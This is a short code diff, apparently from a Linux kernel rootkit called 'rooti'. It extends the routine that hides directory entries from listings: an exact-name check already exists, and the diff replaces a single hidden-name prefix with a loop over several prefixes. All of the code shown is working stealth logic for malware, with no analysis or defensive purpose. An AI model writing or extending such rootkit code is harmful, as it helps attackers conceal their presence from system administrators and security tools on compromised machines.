@@ -33,16 +33,21 @@ void rooti_showme()
 // Determines whether the file entry qualifies to be hidden
 static bool rooti_should_hide_file(struct linux_dirent64 *record)
 {
+    size_t len;
+
     // Check if the entry should be hidden by its name
     for (int i = 0; i < ROOTI_HIDDEN_FILES_COUNT; i++) {
         if (strncmp(record->d_name, ROOTI_HIDDEN_FILES[i], NAME_MAX) == 0) {
             return true;
         }
     }
-    // Check if the entry's name begins with the prefix of hidden files
-    if (strlen(record->d_name) >= ROOTI_HIDE_PREFIX_LEN && 
-        memcmp(record->d_name, ROOTI_HIDE_PREFIX, ROOTI_HIDE_PREFIX_LEN) == 0) {
-        return true;
+    // Check if the entry's name begins with a prefix of hidden files
+    for (int i = 0; i < ROOTI_HIDDEN_FILES_PREFIXES_COUNT; i++) {
+        len = strlen(ROOTI_HIDDEN_FILES_PREFIXES[i]);
+        if (strlen(record->d_name) >= len &&
+            memcmp(record->d_name, ROOTI_HIDDEN_FILES_PREFIXES[i], len) == 0) {
+            return true;
+        }
     }
     return false;
 }
